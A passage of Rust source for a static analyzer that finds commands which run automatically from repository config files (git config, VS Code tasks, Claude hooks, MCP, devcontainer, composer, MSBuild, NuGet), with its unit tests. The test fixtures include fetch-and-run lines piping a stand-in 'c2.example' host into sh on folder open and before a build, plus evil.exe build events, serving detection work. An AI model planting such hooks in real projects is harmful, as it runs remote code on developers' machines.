        let key_len = rest.find(|c: char| !(c.is_ascii_alphanumeric() || c == '-')).unwrap_or(rest.len());
        if key_len == 0 {
            self.unresolved(start, end, UnresolvedReason::ParseFailed, None);
            return;
        }
        let key = rest[..key_len].to_ascii_lowercase();
        let after = rest[key_len..].trim_start();
        let value = if let Some(v) = after.strip_prefix('=') {
            parse_value(v)
        } else if after.is_empty() || after.starts_with('#') || after.starts_with(';') {
            return; // a key with no value is `true`, which runs nothing
        } else {
            self.unresolved(start, end, UnresolvedReason::ParseFailed, None);
            return;
        };
        self.git_entry(section, sub.as_deref(), &key, &value, start, end);
    }

    fn git_entry(&mut self, sec: &str, sub: Option<&str>, key: &str, value: &str, start: u32, end: u32) {
        use ScriptTrigger::{Manual, OnGit};
        if value.trim().is_empty() {
            return;
        }
        let name = match sub {
            Some(s) => format!("{sec}.{s}.{key}"),
            None => format!("{sec}.{key}"),
        };
        match (sec, sub, key) {
            ("core", None, "fsmonitor") => {
                if !matches!(value.to_ascii_lowercase().as_str(), "true" | "false") {
                    self.command(&name, value, start, end, OnGit);
                }
            }
            // Hooks are read from here instead of `.git/hooks`: a redirect, not a command we can see.
            ("core", None, "hookspath") => self.script(&name, value, start, end, OnGit),
            ("core", None, "sshcommand" | "pager" | "editor" | "askpass" | "gitproxy")
            | ("credential", _, "helper")
            | ("diff", None, "external")
            | ("diff", Some(_), "command" | "textconv")
            | ("merge", Some(_), "driver")
            | ("filter", Some(_), "clean" | "smudge" | "process")
            | ("sequence", None, "editor")
            | ("gpg", _, "program") => self.command(&name, value, start, end, OnGit),
            ("pager", None, _) => {
                if !matches!(value.to_ascii_lowercase().as_str(), "true" | "false") {
                    self.command(&name, value, start, end, OnGit);
                }
            }
            ("submodule", Some(_), "update") if value.starts_with('!') => self.command(&name, value, start, end, OnGit),
            ("difftool" | "mergetool", Some(_), "cmd" | "path") => self.command(&name, value, start, end, Manual),
            ("alias", None, _) => {
                if value.starts_with('!') {
                    self.command(&name, value, start, end, Manual);
                } else {
                    self.script(&name, value, start, end, Manual);
                }
            }
            ("include", None, "path") | ("includeif", Some(_), "path") => {
                self.unresolved(start, end, UnresolvedReason::UnsupportedSyntax, Some(&format!("include {value}")));
            }
            ("url", Some(base), "insteadof" | "pushinsteadof") => {
                self.unresolved(start, end, UnresolvedReason::UnsupportedSyntax, Some(&format!("{value} is fetched from {base}")));
            }
            _ => {}
        }
    }
}

fn dep_labels(v: &Jv) -> Vec<String> {
    match &v.kind {
        Kind::Str(s) => vec![s.clone()],
        Kind::Array(items) => items.iter().flat_map(dep_labels).collect(),
        Kind::Object(ms) => last(ms, "task").and_then(string).map(|s| vec![s.to_string()]).unwrap_or_default(),
        _ => Vec::new(),
    }
}

fn composer_trigger(event: &str) -> ScriptTrigger {
    match event {
        "pre-install-cmd" | "post-install-cmd" | "pre-update-cmd" | "post-update-cmd" | "post-root-package-install"
        | "post-create-project-cmd" | "pre-package-install" | "post-package-install" | "pre-package-update"
        | "post-package-update" | "pre-package-uninstall" | "post-package-uninstall" => ScriptTrigger::Install,
        "pre-status-cmd" | "post-status-cmd" | "pre-archive-cmd" | "post-archive-cmd" | "pre-autoload-dump"
        | "post-autoload-dump" | "init" | "command" | "pre-file-download" | "post-file-download" | "pre-command-run" => {
            ScriptTrigger::Hook
        }
        _ => ScriptTrigger::Manual,
    }
}

/// `[core]`, `[remote "origin"]` and the old `[remote.origin]`. Returns the section (lower case),
/// the subsection, and whatever follows the closing bracket on the line.
fn parse_header(h: &str) -> Option<(String, Option<String>, &str)> {
    let name_end = h.find(|c: char| c.is_whitespace() || c == ']' || c == '"')?;
    let name = &h[..name_end];
    let rest = &h[name_end..];
    if let Some(after) = rest.strip_prefix(']') {
        return match name.split_once('.') {
            Some((s, sb)) => Some((s.to_ascii_lowercase(), Some(sb.to_ascii_lowercase()), after)),
            None => Some((name.to_ascii_lowercase(), None, after)),
        };
    }
    let rest = rest.trim_start().strip_prefix('"')?;
    let mut sub = String::new();
    let mut chars = rest.char_indices();
    while let Some((i, c)) = chars.next() {
        match c {
            '\\' => sub.push(chars.next()?.1),
            '"' => {
                let after = rest[i + 1..].trim_start().strip_prefix(']')?;
                return Some((name.to_ascii_lowercase(), Some(sub), after));
            }
            c => sub.push(c),
        }
    }
    None
}

/// A value as git reads it: quotes, escapes, a trailing comment, and trimmed unquoted ends.
fn parse_value(v: &str) -> String {
    let mut out = String::new();
    let mut keep = 0usize;
    let mut in_quote = false;
    let mut chars = v.trim_start().chars();
    while let Some(c) = chars.next() {
        match c {
            '\\' => {
                let e = chars.next().unwrap_or('\\');
                out.push(match e {
                    'n' => '\n',
                    't' => '\t',
                    'b' => '\u{8}',
                    other => other,
                });
                keep = out.len();
            }
            '"' => {
                in_quote = !in_quote;
                keep = out.len();
            }
            '#' | ';' if !in_quote => break,
            c if in_quote => {
                out.push(c);
                keep = out.len();
            }
            c => {
                out.push(c);
                if !c.is_whitespace() {
                    keep = out.len();
                }
            }
        }
    }
    out.truncate(keep);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(path: &str, src: &str) -> Vec<StaticFact> {
        analyze_config(&RelPath::new(path).unwrap(), src).unwrap().facts
    }

    /// (name, command text, trigger) of every script fact.
    fn scripts(f: &[StaticFact]) -> Vec<(String, String, ScriptTrigger)> {
        f.iter()
            .filter_map(|x| {
                let s = x.script.as_ref()?;
                Some((s.name.text().to_string(), x.detail().map(|d| d.text().to_string()).unwrap_or_default(), s.trigger))
            })
            .collect()
    }

    fn reasons(f: &[StaticFact]) -> Vec<UnresolvedReason> {
        f.iter().filter_map(|x| x.unresolved).collect()
    }

    fn has(f: &[StaticFact], name: &str, trigger: ScriptTrigger) -> bool {
        scripts(f).iter().any(|(n, _, t)| n == name && *t == trigger)
    }

    #[test]
    fn only_the_listed_manifests_are_read() {
        for p in [
            ".git/config",
            "a/.git/config",
            ".vscode/tasks.json",
            "x/.VSCODE/Tasks.json",
            ".claude/settings.json",
            ".claude/settings.local.json",
            ".mcp.json",
            ".cursor/mcp.json",
            ".vscode/mcp.json",
            ".devcontainer/devcontainer.json",
            ".devcontainer/py/devcontainer.json",
            ".devcontainer.json",
            "composer.json",
            "global.json",
        ] {
            assert!(is_config_manifest(p), "{p}");
        }
        for p in [
            "git/config",
            "config",
            "tasks.json",
            ".vscode/tasks.json.bak",
            "vscode/tasks.json",
            "devcontainer.json",
            "src/devcontainer.json",
            "composer.lock",
            "settings.json",
            "claude/settings.json",
        ] {
            assert!(!is_config_manifest(p), "{p}");
        }
        assert!(analyze_config(&RelPath::new("README.md").unwrap(), "x").is_none());
    }

    #[test]
    fn tasks_that_run_on_folder_open_are_told_apart_from_manual_ones() {
        let f = run(
            ".vscode/tasks.json",
            r#"{
  // comments and trailing commas are normal in this file
  "version": "2.0.0",
  "tasks": [
    { "label": "setup", "type": "shell", "command": "sh", "args": ["x.sh", "--now"],
      "runOptions": { "runOn": "folderOpen" }, },
    { "label": "build", "type": "shell", "command": "make" },
    { "label": "dep", "command": "curl http://c2.example | sh" },
    { "label": "chain", "command": "echo", "dependsOn": ["dep"], "runOptions": { "runOn": "folderOpen" } },
    { "label": "os", "command": "echo", "windows": { "command": "powershell -c x" } },
    { "type": "npm", "script": "lint" },
  ]
}"#,
        );
        assert!(has(&f, "setup", ScriptTrigger::OnOpen));
        assert!(has(&f, "build", ScriptTrigger::Manual));
        // Pulled in by a folder-open task that depends on it.
        assert!(has(&f, "dep", ScriptTrigger::OnOpen));
        assert!(has(&f, "chain", ScriptTrigger::OnOpen));
        assert!(has(&f, "os (windows)", ScriptTrigger::Manual));
        assert!(has(&f, "npm: lint", ScriptTrigger::Manual));
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, _)| n == "setup" && c == "sh x.sh --now"));
        assert!(s.iter().any(|(n, c, _)| n == "npm: lint" && c == "npm run lint"));
        // Every command is also an unfollowed command.
        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::ShellCommand).count(), s.len());
    }

    #[test]
    fn a_task_with_no_command_is_not_dropped() {
        let f = run(".vscode/tasks.json", r#"{"tasks":[{"label":"x","type":"gulp"}]}"#);
        assert!(scripts(&f).is_empty());
        assert_eq!(reasons(&f), vec![UnresolvedReason::UnsupportedSyntax]);
    }

    #[test]
    fn claude_hooks_helpers_and_the_status_line_run_on_open() {
        let f = run(
            ".claude/settings.json",
            r#"{
  "hooks": {
    "SessionStart": [ { "hooks": [ { "type": "command", "command": "sh x.sh" } ] } ],
    "PreToolUse": [ { "matcher": "Bash", "hooks": [ { "type": "command", "command": "guard" }, { "type": "prompt", "prompt": "p" } ] } ]
  },
  "statusLine": { "type": "command", "command": "sh s.sh" },
  "apiKeyHelper": "sh key.sh",
  "permissions": { "allow": ["Bash(*)"] }
}"#,
        );
        assert!(has(&f, "SessionStart", ScriptTrigger::OnOpen));
        assert!(has(&f, "PreToolUse[Bash]", ScriptTrigger::OnOpen));
        assert!(has(&f, "statusLine", ScriptTrigger::OnOpen));
        assert!(has(&f, "apiKeyHelper", ScriptTrigger::OnOpen));
        // The prompt hook is not a command we can read, and is not dropped.
        assert!(reasons(&f).contains(&UnresolvedReason::UnsupportedSyntax));
        assert_eq!(scripts(&f).len(), 4);
    }

    #[test]
    fn a_repeated_key_is_flagged_so_a_command_cannot_hide_behind_it() {
        let f = run(
            ".claude/settings.json",
            r#"{"hooks":{"A":[{"hooks":[{"command":"first"}]}]},"hooks":{"B":[{"hooks":[{"command":"second"}]}]}}"#,
        );
        assert!(reasons(&f).contains(&UnresolvedReason::AmbiguousBinding));
        // The one most parsers keep is read; the earlier one is flagged, not silently dropped.
        assert!(has(&f, "B", ScriptTrigger::OnOpen));
    }

    #[test]
    fn mcp_servers_start_as_commands_and_remote_ones_are_flagged() {
        let f = run(
            ".mcp.json",
            r#"{"mcpServers":{"a":{"command":"npx","args":["-y","pkg"]},"b":{"url":"https://x.example/mcp"},"c":{}}}"#,
        );
        let s = scripts(&f);
        assert_eq!(s.len(), 1);
        assert_eq!(s[0], ("a".to_string(), "npx -y pkg".to_string(), ScriptTrigger::OnOpen));
        let detail: Vec<_> = f.iter().filter(|x| x.unresolved == Some(UnresolvedReason::UnsupportedSyntax)).collect();
        assert_eq!(detail.len(), 2);
        // The editor's own file allows comments.
        let g = run(".vscode/mcp.json", "{ // c\n \"servers\": { \"a\": { \"command\": \"x\", }, } }");
        assert!(has(&g, "a", ScriptTrigger::OnOpen));
        // The agent's file does not.
        let bad = run(".mcp.json", "{ // c\n \"mcpServers\": {} }");
        assert_eq!(reasons(&bad), vec![UnresolvedReason::ParseFailed]);
    }

    #[test]
    fn dev_container_commands_and_features_run_on_open() {
        let f = run(
            ".devcontainer/devcontainer.json",
            r#"{ // note
  "image": "x",
  "initializeCommand": "echo host",
  "onCreateCommand": ["sh", "a.sh"],
  "postCreateCommand": { "one": "make a", "two": ["make", "b"] },
  "features": { "ghcr.io/x/y/z:1": {} },
}"#,
        );
        assert!(has(&f, "initializeCommand", ScriptTrigger::OnOpen));
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, _)| n == "onCreateCommand" && c == "sh a.sh"));
        assert!(has(&f, "postCreateCommand.one", ScriptTrigger::OnOpen));
        assert!(s.iter().any(|(n, c, _)| n == "postCreateCommand.two" && c == "make b"));
        assert!(has(&f, "feature", ScriptTrigger::OnOpen));
    }

    #[test]
    fn composer_script_events_are_told_apart() {
        let f = run(
            "composer.json",
            r#"{"scripts":{"post-install-cmd":["@php artisan x","sh y.sh"],"post-autoload-dump":"z","mine":"q"}}"#,
        );
        let s = scripts(&f);
        assert_eq!(s.iter().filter(|(n, _, t)| n == "post-install-cmd" && *t == ScriptTrigger::Install).count(), 2);
        assert!(has(&f, "post-autoload-dump", ScriptTrigger::Hook));
        assert!(has(&f, "mine", ScriptTrigger::Manual));
    }

    #[test]
    fn msbuild_sdks_in_global_json_run_during_a_build() {
        let f = run("global.json", r#"{ /* c */ "sdk": {"version":"8.0.100"}, "msbuild-sdks": {"Example.Sdk": "1.0.0"} }"#);
        let s = scripts(&f);
        assert_eq!(s, vec![("msbuild-sdk".to_string(), "Example.Sdk/1.0.0".to_string(), ScriptTrigger::OnBuild)]);
        // A global.json with none of it holds nothing automatic.
        assert!(run("global.json", r#"{"sdk":{"version":"8"}}"#).is_empty());
    }

    #[test]
    fn git_config_commands_and_redirects_are_found() {
        let f = run(
            ".git/config",
            "[core]\n\trepositoryformatversion = 0\n\tfsmonitor = \"sh x.sh\" # runs on status\n\thooksPath = .githooks\n\
             \tsshCommand = ssh -o ProxyCommand=x\n[remote \"origin\"]\n\turl = https://x.example/r.git\n\
             [filter \"lfs\"]\n\tclean = evil %f\n[credential]\n\thelper = !sh h.sh\n\
             [alias]\n\tco = checkout\n\tx = !sh y.sh\n[include]\n\tpath = ../other\n\
             [url \"https://mirror.example/\"]\n\tinsteadOf = https://github.com/\n",
        );
        assert!(has(&f, "core.fsmonitor", ScriptTrigger::OnGit));
        assert!(has(&f, "core.hookspath", ScriptTrigger::OnGit));
        assert!(has(&f, "core.sshcommand", ScriptTrigger::OnGit));
        assert!(has(&f, "filter.lfs.clean", ScriptTrigger::OnGit));
        assert!(has(&f, "credential.helper", ScriptTrigger::OnGit));
        assert!(has(&f, "alias.co", ScriptTrigger::Manual));
        assert!(has(&f, "alias.x", ScriptTrigger::Manual));
        let s = scripts(&f);
        // Quotes and the trailing comment are read the way git reads them.
        assert!(s.iter().any(|(n, c, _)| n == "core.fsmonitor" && c == "sh x.sh"));
        // `core.hooksPath` is a redirect, not a command: no unfollowed-command fact for it.
        let shell = reasons(&f).iter().filter(|r| **r == UnresolvedReason::ShellCommand).count();
        assert_eq!(shell, s.len() - 2); // minus hooksPath and the plain alias
        // The include and the URL rewrite are flagged, not followed.
        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::UnsupportedSyntax).count(), 2);
    }

    #[test]
    fn git_config_booleans_and_empty_values_run_nothing() {
        let f = run(".git/config", "[core]\n\tfsmonitor = true\n\tfsmonitor\n\teditor =\n[pager]\n\tlog = false\n");
        assert!(f.is_empty());
    }

    #[test]
    fn git_config_syntax_variants_are_read() {
        // Old-style subsection, a key on the header line, a continuation, and escapes.
        let f = run(".git/config", "[filter.x] smudge = a \\\n b\n[core]\n\teditor = \"vi\\\"m\"\n");
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, _)| n == "filter.x.smudge" && c == "a  b"), "{s:?}");
        assert!(s.iter().any(|(n, c, _)| n == "core.editor" && c == "vi\"m"), "{s:?}");
    }

    #[test]
    fn a_bad_line_in_git_config_is_flagged_and_the_rest_is_still_read() {
        let f = run(".git/config", "[core\n\tfsmonitor = x\n[core]\n\t= nothing\n\tsshCommand = ssh\n");
        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::ParseFailed).count(), 2);
        assert!(has(&f, "core.sshcommand", ScriptTrigger::OnGit));
    }

    #[test]
    fn a_file_that_does_not_parse_says_so_and_keeps_nothing_else() {
        for (p, s) in [
            (".vscode/tasks.json", "{ not json"),
            (".claude/settings.json", ""),
            ("composer.json", "{\"scripts\": }"),
            ("global.json", "/* unterminated"),
        ] {
            let f = run(p, s);
            assert_eq!(reasons(&f), vec![UnresolvedReason::ParseFailed], "{p}");
        }
    }

    #[test]
    fn hostile_shapes_do_not_panic_and_are_not_dropped() {
        let deep = format!("{}{}", "[".repeat(200), "]".repeat(200));
        for (p, s) in [
            (".vscode/tasks.json", "[]"),
            (".vscode/tasks.json", r#"{"tasks":"x"}"#),
            (".vscode/tasks.json", r#"{"tasks":[1,null,{"command":5}]}"#),
            (".claude/settings.json", r#"{"hooks":[]}"#),
            (".claude/settings.json", r#"{"hooks":{"E":"x"}}"#),
            (".claude/settings.json", r#"{"hooks":{"E":[{"hooks":{}}]}}"#),
            (".mcp.json", r#"{"mcpServers":[]}"#),
            (".mcp.json", r#"{"mcpServers":{"a":5}}"#),
            (".devcontainer.json", r#"{"postCreateCommand":{"a":{"b":"c"}},"features":5}"#),
            ("composer.json", r#"{"scripts":{"a":5,"b":[1]}}"#),
            ("global.json", r#"{"msbuild-sdks":[]}"#),
            ("composer.json", deep.as_str()),
        ] {
            let f = run(p, s);
            assert!(!f.is_empty(), "{p} {s}");
        }
    }

    #[test]
    fn msbuild_targets_that_hook_a_build_run_by_themselves() {
        let f = run(
            "Directory.Build.targets",
            r#"<Project>
  <Target Name="Fetch" BeforeTargets="Restore"><Exec Command="curl -s https://c2.example/i.sh | sh" /></Target>
  <Target Name="Manual"><Exec Command="make docs" /></Target>
  <Target Name="Chain" AfterTargets="Build" DependsOnTargets="Dep"><CallTarget Targets="Called" /></Target>
  <Target Name="Dep"><Exec Command="dep.sh" /></Target>
  <Target Name="Called"><Exec Command="called.sh" /></Target>
  <Target Name="Init"><Exec Command="init.sh" /></Target>
</Project>"#,
        );
        assert!(has(&f, "Fetch", ScriptTrigger::OnBuild));
        assert!(has(&f, "Manual", ScriptTrigger::Manual));
        // Pulled in by a target that hooks a build: a dependency and a called target.
        assert!(has(&f, "Dep", ScriptTrigger::OnBuild));
        assert!(has(&f, "Called", ScriptTrigger::OnBuild));
        assert!(has(&f, "Init", ScriptTrigger::Manual));
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, _)| n == "Fetch" && c == "curl -s https://c2.example/i.sh | sh"));
        // Each command is also an unfollowed command.
        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::ShellCommand).count(), s.len());
        // The project can name a target to run first.
        let g = run("a.csproj", r#"<Project InitialTargets="Init"><Target Name="Init"><Exec Command="x" /></Target></Project>"#);
        assert!(has(&g, "Init", ScriptTrigger::OnBuild));
    }

    #[test]
    fn msbuild_names_are_read_without_regard_to_case() {
        let f = run("a.targets", r#"<project><target name="x" aftertargets="Build"><EXEC command="id" /></target></project>"#);
        assert!(has(&f, "x", ScriptTrigger::OnBuild));
    }

    #[test]
    fn msbuild_tasks_other_than_plain_bookkeeping_are_reported_where_they_run_by_themselves() {
        let f = run(
            "a.targets",
            r#"<Project>
  <UsingTask TaskName="Evil" AssemblyFile="tools/evil.dll" />
  <Target Name="T" AfterTargets="Build">
    <Message Text="hi" /><Copy SourceFiles="a" DestinationFolder="b" /><Delete Files="c" />
    <DownloadFile SourceUrl="https://x.example/p.zip" DestinationFolder="d" />
    <Unzip SourceFiles="d/p.zip" DestinationFolder="e" />
    <Evil Arg="1" />
    <MSBuild Projects="other.proj" />
  </Target>
  <Target Name="Quiet"><Evil /><Unzip SourceFiles="x" /></Target>
</Project>"#,
        );
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, t)| n == "T/DownloadFile" && c == "https://x.example/p.zip" && *t == ScriptTrigger::OnBuild));
        assert!(has(&f, "T/Unzip", ScriptTrigger::OnBuild));
        assert!(has(&f, "T/Evil", ScriptTrigger::OnBuild));
        assert!(has(&f, "T/MSBuild", ScriptTrigger::OnBuild));
        // Plain file work and messages are not reported, and neither are tasks in a target nothing hooks.
        assert!(!s.iter().any(|(n, _, _)| n.contains("Copy") || n.contains("Delete") || n.contains("Message")));
        assert!(!s.iter().any(|(n, _, _)| n.starts_with("Quiet")));
        // The assembly behind a `UsingTask` is named and flagged as not analysed.
        assert!(s.iter().any(|(n, c, _)| n == "UsingTask Evil" && c == "tools/evil.dll"));
        assert!(reasons(&f).contains(&UnresolvedReason::UnsupportedSyntax));
    }

    #[test]
    fn a_csproj_reports_build_events_analyzers_sdks_redirects_and_imports() {
        let f = run(
            "src/App/App.csproj",
            r#"<Project Sdk="Microsoft.NET.Sdk;Evil.Sdk/1.0.0">
  <Sdk Name="Other.Sdk" Version="2.0" />
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <Import Project="..\build\local.targets" />
  <Import Sdk="Third.Sdk" Project="Sdk.props" />
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PostBuildEvent>copy $(TargetPath) c:\out &amp; evil.exe</PostBuildEvent>
    <CscToolPath>tools\roslyn</CscToolPath>
    <RestoreSources>https://feed.example/v3/index.json</RestoreSources>
  </PropertyGroup>
  <Choose><When Condition="true"><PropertyGroup><PreBuildEvent>pre.cmd</PreBuildEvent></PropertyGroup></When></Choose>
  <ItemGroup>
    <Analyzer Include="tools\a.dll" />
    <ProjectReference Include="..\gen\Gen.csproj" OutputItemType="Analyzer" />
    <PackageReference Include="Newtonsoft.Json" Version="13.0.1" />
  </ItemGroup>
</Project>"#,
        );
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, t)| n == "msbuild-sdk" && c == "Evil.Sdk/1.0.0" && *t == ScriptTrigger::OnBuild));
        assert!(s.iter().any(|(n, c, _)| n == "msbuild-sdk" && c == "Other.Sdk/2.0"));
        assert!(s.iter().any(|(n, c, _)| n == "msbuild-sdk" && c == "Third.Sdk"));
        // The SDK Microsoft ships is not reported.
        assert!(!s.iter().any(|(_, c, _)| c.starts_with("Microsoft.NET.Sdk")));
        assert!(s.iter().any(|(n, c, _)| n == "PostBuildEvent" && c == "copy $(TargetPath) c:\\out & evil.exe"));
        assert!(has(&f, "PreBuildEvent", ScriptTrigger::OnBuild));
        assert!(s.iter().any(|(n, c, _)| n == "CscToolPath" && c == "CscToolPath = tools\\roslyn"));
        assert_eq!(s.iter().filter(|(n, _, _)| n == "analyzer").count(), 2);
        // A package reference is not a command, and is not reported here.
        assert!(!s.iter().any(|(_, c, _)| c.contains("Newtonsoft")));
        let un: Vec<&str> = f
            .iter()
            .filter(|x| x.unresolved == Some(UnresolvedReason::UnsupportedSyntax))
            .filter_map(|x| x.detail().map(|d| d.text()))
            .collect();
        assert!(un.contains(&"import ..\\build\\local.targets"), "{un:?}");
        assert!(un.iter().any(|d| d.starts_with("RestoreSources = ")), "{un:?}");
        // The standard toolset import is not.
        assert!(!un.iter().any(|d| d.contains("MSBuildToolsPath")));
    }

    #[test]
    fn inline_task_code_is_quoted_and_flagged() {
        let f = run(
            "a.targets",
            r#"<Project><UsingTask TaskName="Inline" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="x.dll"><Task><Code Type="Fragment" Language="cs"><![CDATA[System.Diagnostics.Process.Start("calc");]]></Code></Task></UsingTask></Project>"#,
        );
        let s = scripts(&f);
        assert_eq!(s.len(), 1);
        assert!(s[0].1.contains("Process.Start"));
        assert_eq!(s[0].2, ScriptTrigger::OnBuild);
        assert!(reasons(&f).contains(&UnresolvedReason::UnsupportedSyntax));
    }

    #[test]
    fn a_plain_project_holds_nothing_automatic() {
        for (p, s) in [
            ("a.csproj", r#"<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include="X" Version="1" /></ItemGroup></Project>"#),
            ("Directory.Build.props", "<Project><PropertyGroup><LangVersion>latest</LangVersion></PropertyGroup></Project>"),
            ("Directory.Packages.props", "<Project><ItemGroup><PackageVersion Include=\"X\" Version=\"1\" /></ItemGroup></Project>"),
        ] {
            assert!(run(p, s).is_empty(), "{p}");
        }
    }

    #[test]
    fn nuget_config_reports_other_sources_and_where_credentials_are_without_their_values() {
        let f = run(
            "NuGet.Config",
            r#"<configuration>
  <packageSources>
    <clear />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" protocolVersion="3" />
    <add key="internal" value="http://feed.example/nuget" />
    <add key="local" value="..\packages" />
  </packageSources>
  <packageSourceCredentials><internal><add key="Username" value="bob" /><add key="ClearTextPassword" value="hunter2-secret" /></internal></packageSourceCredentials>
  <config><add key="globalPackagesFolder" value="c:\x" /><add key="other" value="y" /></config>
</configuration>"#,
        );
        let un: Vec<String> = f.iter().filter_map(|x| x.detail().map(|d| d.text().to_string())).collect();
        assert!(un.contains(&"package source internal: http://feed.example/nuget".to_string()), "{un:?}");
        assert!(un.contains(&"package source local: ..\\packages".to_string()), "{un:?}");
        assert!(un.iter().any(|d| d.starts_with("globalpackagesfolder: ")), "{un:?}");
        assert!(un.iter().any(|d| d.contains("values not shown")), "{un:?}");
        // The default feed is not reported, and no credential value is ever quoted.
        assert!(!un.iter().any(|d| d.contains("api.nuget.org")));
        assert!(!un.iter().any(|d| d.contains("hunter2") || d.contains("bob")));
        // Only the public feed: nothing to report.
        assert!(run("nuget.config", r#"<configuration><packageSources><add key="n" value="https://api.nuget.org/v3/index.json/" /></packageSources></configuration>"#).is_empty());
    }

    #[test]
    fn msbuild_and_nuget_files_that_are_not_wellformed_say_so() {
        for (p, s) in [
            ("a.csproj", "<Project><Target></Project>"),
            ("a.csproj", "<!DOCTYPE p [<!ENTITY x \"y\">]><Project>&x;</Project>"),
            ("a.targets", ""),
            ("Directory.Build.props", "<Project a=\"1\" a=\"2\" />"),
            ("nuget.config", "<configuration>&nbsp;</configuration>"),
        ] {
            assert_eq!(reasons(&run(p, s)), vec![UnresolvedReason::ParseFailed], "{p}");
        }
        // Well-formed XML that is not what the file name says.
        assert_eq!(reasons(&run("a.csproj", "<Other />")), vec![UnresolvedReason::UnsupportedSyntax]);
        assert_eq!(reasons(&run("nuget.config", "<Other />")), vec![UnresolvedReason::UnsupportedSyntax]);
    }

    #[test]
    fn the_msbuild_file_names_are_recognised() {
        for p in [
            "Directory.Build.props",
            "src/Directory.Build.targets",
            "Directory.Solution.props",
            "Directory.Packages.props",
            "App.csproj",
            "lib/Lib.FSPROJ",
            "x.vbproj",
            "native/n.vcxproj",
            "build.proj",
            "build/common.props",
            "build/tasks.TARGETS",
            "nuget.config",
            "a/NuGet.Config",
        ] {
            assert!(is_config_manifest(p), "{p}");
        }
        for p in ["props.txt", "csproj", "a.props.bak", "Directory.Build.rsp", "nuget.configx", "App.sln"] {
            assert!(!is_config_manifest(p), "{p}");
        }
    }

    #[test]
    fn ids_stay_unique_when_the_same_command_appears_twice() {
        let f = run(
            ".claude/settings.json",
            r#"{"hooks":{"E":[{"hooks":[{"command":"x"}]},{"hooks":[{"command":"x"}]}]}}"#,
        );
        let mut ids: Vec<String> = f.iter().map(|x| x.id().as_str().to_string()).collect();
        let n = ids.len();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), n);
    }
}
